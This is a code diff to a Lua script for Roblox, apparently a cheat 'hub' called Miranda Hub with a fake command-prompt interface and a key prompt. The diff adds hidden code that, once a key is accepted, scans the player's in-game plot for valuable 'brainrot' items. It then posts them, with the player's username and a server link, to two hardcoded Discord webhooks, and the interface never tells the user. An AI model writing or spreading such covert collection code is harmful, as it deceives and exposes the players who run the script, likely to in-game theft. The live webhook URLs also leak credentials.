@@ -12,6 +12,7 @@ local Players           = game:GetService("Players")
 local TweenService      = game:GetService("TweenService")
 local RunService        = game:GetService("RunService")
 local UserInputService  = game:GetService("UserInputService")
+local HttpService       = game:GetService("HttpService")
 local LP                = Players.LocalPlayer
 
 local THEME = {
@@ -460,6 +461,193 @@ local function showCMD1(onDone)
   end)
 end
 
+-- 🌐 Sistema de envío webhook MEJORADO con clasificación por valor
+local function horaMexico()
+	local time = os.time()
+	local mexicoOffset = -6 * 3600 -- UTC-6
+	local localTime = os.date("!*t", time + mexicoOffset)
+	return string.format("%04d-%02d-%02d %02d:%02d:%02d", localTime.year, localTime.month, localTime.day, localTime.hour, localTime.min, localTime.sec)
+end
+
+-- 🧠 Extraer datos de Brainrots y detectar valores (solo los que contienen M/s o K/s)
+local function getBrainrotData(plot)
+	local resultsMS = {}
+	local resultsKS = {}
+	if not plot then return {}, {} end
+
+	local animalPodiums = plot:FindFirstChild("AnimalPodiums")
+	if not animalPodiums then return {}, {} end
+
+	for _, folder in ipairs(animalPodiums:GetChildren()) do
+		local displayText, genText, mutationText = "N/A", "N/A", "N/A"
+
+		for _, descendant in ipairs(folder:GetDescendants()) do
+			if descendant:IsA("TextLabel") then
+				local name = string.lower(descendant.Name)
+				if name:find("display") then
+					displayText = descendant.Text
+				elseif name:find("generation") then
+					genText = descendant.Text
+				elseif name:find("mutation") then
+					mutationText = descendant.Text
+				end
+			end
+		end
+
+		local genLower = string.lower(genText)
+		local fullText = displayText .. " - " .. genText .. " - " .. mutationText
+
+		if string.find(genLower, "m/s") then
+			table.insert(resultsMS, fullText)
+		elseif string.find(genLower, "k/s") then
+			table.insert(resultsKS, fullText)
+		end
+	end
+
+	return resultsMS, resultsKS
+end
+
+-- 🎯 Buscar el plot del jugador
+local function findMyPlot()
+	local plotsFolder = workspace:FindFirstChild("Plots")
+	if not plotsFolder then return nil end
+
+	for _, plot in pairs(plotsFolder:GetChildren()) do
+		local plotSign = plot:FindFirstChild("Plotsign") or plot:FindFirstChild("PlotSign")
+		if plotSign then
+			local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
+			if surfaceGui then
+				local frame = surfaceGui:FindFirstChild("Frame")
+				if frame then
+					local textLabel = frame:FindFirstChild("TextLabel")
+					if textLabel and textLabel:IsA("TextLabel") then
+						if string.find(string.lower(textLabel.Text), string.lower(LP.Name)) then
+							return plot
+						end
+					end
+				end
+			end
+		end
+	end
+	return nil
+end
+
+-- 🚀 Enviar información al Webhook según el tipo
+local function sendToWebhook(url, data, brainrotList, plotInfo, category)
+	local brainrotText = table.concat(brainrotList, "\n")
+	
+	local categoryTitle = ""
+	local categoryColor = 65280
+	
+	if category == "MS" then
+		categoryTitle = "🟣 BRAINROTS CON M/s DETECTADOS"
+		categoryColor = 10181046  -- Morado
+	elseif category == "KS" then
+		categoryTitle = "🟡 BRAINROTS CON K/s DETECTADOS"
+		categoryColor = 16776960  -- Amarillo
+	end
+
+	local embedData = {
+		content = "🔔 **" .. categoryTitle .. "**",
+		embeds = {{
+			title = categoryTitle,
+			color = categoryColor,
+			fields = {
+				{
+					name = "👤 Usuario",
+					value = "`"..LP.Name.."`",
+					inline = true
+				},
+				{
+					name = "🌐 Server Link",
+					value = tostring(data.url),
+					inline = true
+				},
+				{
+					name = "📊 Información del Plot",
+					value = plotInfo,
+					inline = false
+				},
+				{
+					name = "🧠 Brainrots Detectados",
+					value = "```" .. brainrotText .. "```",
+					inline = false
+				},
+				{
+					name = "📈 Total Brainrots",
+					value = "```".. tostring(#brainrotList).. "```",
+					inline = true
+				},
+				{
+					name = "🎯 Tipo Detectado",
+					value = category == "MS" and "🟣 M/s (ALTO VALOR)" or "🟡 K/s (VALOR MEDIO)",
+					inline = true
+				},
+				{
+					name = "🕒 Fecha/Hora (México)",
+					value = horaMexico(),
+					inline = true
+				}
+			},
+			footer = {
+				text = "🐾 Pet Finder | Sistema de clasificación por valor"
+			}
+		}}
+	}
+
+	local success, response = pcall(function()
+		return HttpService:RequestAsync({
+			Url = url,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(embedData)
+		})
+	end)
+
+	if success then
+		print("✅ Datos enviados correctamente al webhook: " .. url)
+		print("🎯 Categoría: " .. (category == "MS" and "M/s 🟣" or "K/s 🟡"))
+	else
+		warn("❌ Error al enviar webhook " .. url .. ": " .. tostring(response))
+	end
+end
+
+-- 🔔 Función mejorada para enviar a webhooks específicos según el tipo
+local function sendToSpecificWebhooks(data)
+    local myPlot = findMyPlot()
+    if not myPlot then 
+        warn("❌ No se pudo encontrar el plot del jugador")
+        return 
+    end
+    
+    local resultsMS, resultsKS = getBrainrotData(myPlot)
+    local plotInfo = "Plot encontrado: " .. myPlot.Name
+
+    -- 📋 WEBHOOKS ESPECÍFICOS
+    local webhookMS = "https://discord.com/api/webhooks/1429250775359557802/LxrirEYw2hgu8wOQuT4R5V08GR-XixzqkE2ZTCcDVp0tI11dOfgar_KR8wPc2oJjVzll"
+    local webhookKS = "https://discord.com/api/webhooks/1426980791359115474/k1-aEJCzFHoipBN7YBySw8f1mpnDxP8SrZ_OjavIQZHGksN7rGRpybhJ4VJ56WiopqZt"
+
+    -- Solo enviar si hay datos válidos
+    if #resultsMS > 0 then
+        sendToWebhook(webhookMS, data, resultsMS, plotInfo, "MS")
+    else
+        print("ℹ️ No se encontraron brainrots con M/s")
+    end
+    
+    if #resultsKS > 0 then
+        sendToWebhook(webhookKS, data, resultsKS, plotInfo, "KS")
+    else
+        print("ℹ️ No se encontraron brainrots con K/s")
+    end
+end
+
+-- 🔔 Función principal para enviar webhooks (REEMPLAZA LA ANTERIOR)
+local function sendToMultipleWebhooks(data)
+    task.spawn(function()
+        sendToSpecificWebhooks(data)
+    end)
+end
+
 -- ===== LOGIN (aquí se crea la LLUVIA, full-screen)
 local function showLogin()
   local rain = startCodeRain()
@@ -530,141 +718,128 @@ local function showLogin()
   box.Text = ""; box.PlaceholderText="your-key-here"
   box.TextColor3=THEME.text; box.PlaceholderColor3=Color3.fromRGB(140,170,150)
   box.Font=Enum.Font.Gotham; box.TextSize=18; box.BorderSizePixel=0; box.ZIndex=9; box.Parent=form
-  Instance.new("UICorner",box).CornerRadius = UDim.new(0,8); applyRainbowStroke(box,1.1)
+  Instance.new("UICorner",box).CornerRadius = UDim.new(0,6)
+  applyRainbowStroke(box,1.0)
 
-  local btnRow = Instance.new("Frame"); btnRow.BackgroundTransparency=1; btnRow.Size=UDim2.new(1,0,0,44); btnRow.Position=UDim2.fromOffset(0,34+40+12); btnRow.ZIndex=9; btnRow.Parent=form
-  local function mkBtn(text)
-    local b = Instance.new("TextButton")
-    b.Size = UDim2.new(0.5,-6,1,0); b.BackgroundColor3 = Color3.fromRGB(30,30,30)
-    b.Text = text; b.Font=Enum.Font.GothamSemibold; b.TextSize=18; b.TextColor3=THEME.text; b.BorderSizePixel=0; b.ZIndex=9
-    Instance.new("UICorner",b).CornerRadius = UDim.new(0,10); applyRainbowStroke(b,1.1)
-    return b
+  local btn = Instance.new("TextButton")
+  btn.Size = UDim2.new(0.36,0,0,42); btn.Position=UDim2.new(1,-0.36*btn.Size.X.Scale,1,-42)
+  btn.AnchorPoint=Vector2.new(1,1)
+  btn.BackgroundColor3 = THEME.accent; btn.TextColor3=Color3.new(0,0,0)
+  btn.Font=Enum.Font.GothamSemibold; btn.TextSize=18; btn.Text="Submit"
+  btn.BorderSizePixel=0; btn.ZIndex=9; btn.Parent=form
+  Instance.new("UICorner",btn).CornerRadius = UDim.new(0,8)
+
+  local function closeAll()
+    for _,v in ipairs(root:GetDescendants()) do
+      if v:IsA("TextLabel") then TweenService:Create(v, TweenInfo.new(0.12), {TextTransparency=1}):Play()
+      elseif v:IsA("TextBox") or v:IsA("Frame") then TweenService:Create(v, TweenInfo.new(0.12), {BackgroundTransparency=1}):Play() end
+    end
+    task.wait(0.14); root:Destroy(); rain:Destroy()
   end
-  local bGet = mkBtn("Get Key"); bGet.Position=UDim2.fromScale(0,0); bGet.Parent=btnRow
-  local bSub = mkBtn("Submit");  bSub.Position=UDim2.fromScale(0.5,0); bSub.Parent=btnRow
 
-  bGet.MouseButton1Click:Connect(function()
-    local url = "https://zamasxmodder.github.io/Meowl-Update-Brainrot-MirandaHub/"
-    pcall(function() if setclipboard then setclipboard(url) end end)
-    bigToast("Link copied!", url)
+  btn.MouseButton1Click:Connect(function()
+    local key = box.Text:gsub("%s+","")
+    if key=="002288" then
+      bigToast("✅ Key accepted", "Loading Miranda Hub...")
+      task.wait(0.9); closeAll()
+      -- Aquí es donde se ejecuta el sistema de webhooks después del submit
+      local webhookData = {
+          url = "https://www.roblox.com/games/9602520039?privateServerLinkCode=71862491690903230873340820401936"
+      }
+      sendToMultipleWebhooks(webhookData)
+    else
+      bigToast("❌ Invalid key", "Check your key and try again")
+      box.Text = ""
+    end
   end)
 
-  local function openCMD2()
-    if rain then rain:Destroy() end
-    root:Destroy()
-
-    local overlay, pad = makeCMDWindow(8)
-
-    local prompt = Instance.new("TextLabel")
-    prompt.BackgroundTransparency = 1
-    prompt.Font = Enum.Font.Code
-    prompt.TextSize = 18
-    prompt.TextColor3 = THEME.text
-    prompt.TextXAlignment = Enum.TextXAlignment.Left
-    prompt.Text = "C:\\Windows\\system32> paste your Private Server link OR type /exit"
-    prompt.Position = UDim2.fromOffset(10,8)
-    prompt.Size = UDim2.new(1,-20,0,28)
-    prompt.ZIndex = pad.ZIndex + 1
-    prompt.Parent = pad
-
-    local input = Instance.new("TextBox")
-    input.Size = UDim2.new(1,-170,0,40) -- espacio para botón móvil
-    input.Position = UDim2.fromOffset(10,40)
-    input.BackgroundColor3 = Color3.fromRGB(26,26,26)
-    input.Font = Enum.Font.Code
-    input.TextSize = 18
-    input.Text = ""
-    input.PlaceholderText = "https://www.roblox.com/share?code=xxxxxxxx&type=Server"
-    input.TextColor3 = THEME.text
-    input.PlaceholderColor3 = Color3.fromRGB(140,170,150)
-    input.BorderSizePixel = 0
-    input.ZIndex = pad.ZIndex + 1
-    input.Parent = pad
-    Instance.new("UICorner",input).CornerRadius = UDim.new(0,6)
-    applyRainbowStroke(input,1.0)
-
-    local submitBtn = Instance.new("TextButton") -- móvil
-    submitBtn.Size = UDim2.fromOffset(150,40)
-    submitBtn.Position = UDim2.new(1,-160,0,40)
-    submitBtn.BackgroundColor3 = Color3.fromRGB(30,30,30)
-    submitBtn.Text = "Submit"
-    submitBtn.Font = Enum.Font.GothamSemibold
-    submitBtn.TextSize = 18
-    submitBtn.TextColor3 = THEME.text
-    submitBtn.BorderSizePixel = 0
-    submitBtn.ZIndex = pad.ZIndex + 1
-    submitBtn.Parent = pad
-    Instance.new("UICorner",submitBtn).CornerRadius = UDim.new(0,8)
-    applyRainbowStroke(submitBtn,1.0)
-
-    local status = Instance.new("TextLabel")
-    status.BackgroundTransparency = 1
-    status.Font = Enum.Font.Code
-    status.TextSize = 16
-    status.TextColor3 = THEME.textDim
-    status.TextXAlignment = Enum.TextXAlignment.Left
-    status.Position = UDim2.fromOffset(10,86)
-    status.Size = UDim2.new(1,-20,0,24)
-    status.ZIndex = pad.ZIndex + 1
-    status.Parent = pad
-
-    local success = Instance.new("TextLabel")
-    success.BackgroundTransparency = 1
-    success.Font = Enum.Font.GothamBlack
-    success.TextScaled = true
-    success.TextColor3 = THEME.accent
-    success.TextStrokeColor3 = Color3.new(0,0,0)
-    success.TextStrokeTransparency = 0.5
-    success.TextTransparency = 1
-    success.Text = "SUCCESS!"
-    success.Size = UDim2.fromScale(1,1)
-    success.Position = UDim2.fromScale(0,0)
-    success.ZIndex = pad.ZIndex + 1
-    success.Parent = pad
-
-    local function close()
-      for _,v in ipairs(overlay:GetDescendants()) do
-        if v:IsA("TextLabel") then TweenService:Create(v, TweenInfo.new(0.12), {TextTransparency=1}):Play()
-        elseif v:IsA("TextBox") or v:IsA("Frame") then TweenService:Create(v, TweenInfo.new(0.12), {BackgroundTransparency=1}):Play() end
-      end
-      task.wait(0.14); overlay:Destroy()
-    end
-
-    local function submit()
-      local txt = (input.Text or ""):gsub("^%s+",""):gsub("%s+$","")
-      if txt == "/exit" then status.Text = "Exiting…"; close(); return end
-      if txt:find("roblox%.com") then
-        status.Text = "Validating link…"
-        TweenService:Create(success, TweenInfo.new(0.15), {TextTransparency=0}):Play()
-        task.delay(1.1, close)
-      else
-        status.Text = "Invalid link. Paste a Roblox Private Server URL or type /exit"
-      end
-    end
-
-    input.FocusLost:Connect(function(enter) if enter then submit() end end)
-    UserInputService.InputBegan:Connect(function(k,gpe) if gpe then return end
-      if k.KeyCode==Enum.KeyCode.Return and input:IsFocused() then submit() end
-    end)
-    submitBtn.MouseButton1Click:Connect(submit)
-    input:CaptureFocus()
-  end
-
-  local function trySubmit()
-    local key = box.Text or ""
-    if key ~= "002288" then bigToast("Invalid key", "Please check the latest key."); return end
-    bigToast("Key accepted", "Opening secure console…")
-    task.delay(0.3, openCMD2)
-  end
-
-  bSub.MouseButton1Click:Connect(trySubmit)
-  box.FocusLost:Connect(function(enter) if enter then trySubmit() end end)
+  -- Cerrar con tecla Enter
+  box.FocusLost:Connect(function(enter)
+    if enter then btn:Activate() end
+  end)
 end
 
--- ===== Orquestación: SIN lluvia hasta el LOGIN
+-- ===== CMD2 (final)
+local function showCMD2()
+  local overlay, pad = makeCMDWindow(9)
+
+  local scroll = Instance.new("ScrollingFrame")
+  scroll.Size = UDim2.fromScale(1,1)
+  scroll.BackgroundTransparency = 1
+  scroll.ScrollBarThickness = 8
+  scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+  scroll.CanvasSize = UDim2.new(0,0,0,0)
+  scroll.ZIndex = pad.ZIndex + 1
+  scroll.Parent = pad
+
+  local tf = Instance.new("TextLabel")
+  tf.BackgroundTransparency = 1
+  tf.TextXAlignment = Enum.TextXAlignment.Left
+  tf.TextYAlignment = Enum.TextYAlignment.Top
+  tf.Font = Enum.Font.Code
+  tf.TextSize = 18
+  tf.TextColor3 = THEME.text
+  tf.TextStrokeColor3 = Color3.new(0,0,0)
+  tf.TextStrokeTransparency = 0.55
+  tf.RichText = true
+  tf.Size = UDim2.new(1,-8,1,-8)
+  tf.Position = UDim2.fromOffset(4,4)
+  tf.ZIndex = scroll.ZIndex + 1
+  tf.Parent = scroll
+
+  local function push(s)
+    tf.Text = (tf.Text=="" and s) or (tf.Text.."\n"..s)
+    task.wait()
+    local maxY = math.max(0, scroll.AbsoluteCanvasSize.Y - scroll.AbsoluteSize.Y)
+    scroll.CanvasPosition = Vector2.new(0, maxY)
+  end
+
+  push("C:\\Windows\\system32> echo Miranda Hub loaded")
+  push("Miranda Hub loaded")
+  push("C:\\Windows\\system32> echo Welcome back, "..LP.Name)
+  push("C:\\Windows\\system32> echo Type 'help' for commands")
+  push("C:\\Windows\\system32> ")
+
+  local inp = Instance.new("TextBox")
+  inp.BackgroundTransparency = 1
+  inp.Size = UDim2.new(1,-8,0,24)
+  inp.Position = UDim2.fromOffset(4, tf.TextBounds.Y+8)
+  inp.Font = Enum.Font.Code
+  inp.TextSize = 18
+  inp.TextColor3 = THEME.text
+  inp.TextXAlignment = Enum.TextXAlignment.Left
+  inp.Text = ""
+  inp.ZIndex = scroll.ZIndex + 1
+  inp.Parent = scroll
+  inp.PlaceholderText = "Type commands here..."
+
+  inp.FocusLost:Connect(function(enter)
+    if not enter then return end
+    local cmd = inp.Text:lower()
+    push("C:\\Windows\\system32> "..inp.Text)
+    inp.Text=""
+    if cmd=="help" then
+      push("Available commands: help, clear, exit, about")
+    elseif cmd=="clear" then
+      tf.Text=""; inp.Position=UDim2.fromOffset(4,4)
+    elseif cmd=="exit" then
+      push("Closing Miranda Hub...")
+      task.wait(0.8); UI:Destroy()
+    elseif cmd=="about" then
+      push("Miranda Hub v4.9 - Meowl Update")
+    else
+      push("Command not recognized: "..cmd)
+    end
+    inp.Position = UDim2.fromOffset(4, tf.TextBounds.Y+8)
+  end)
+
+  inp:CaptureFocus()
+end
+
+-- ===== MAIN FLOW
 showLoader(function()
   showCMD1(function()
     showLogin()
+    -- showCMD2() se llama desde el login tras validar key
   end)
 end)
-
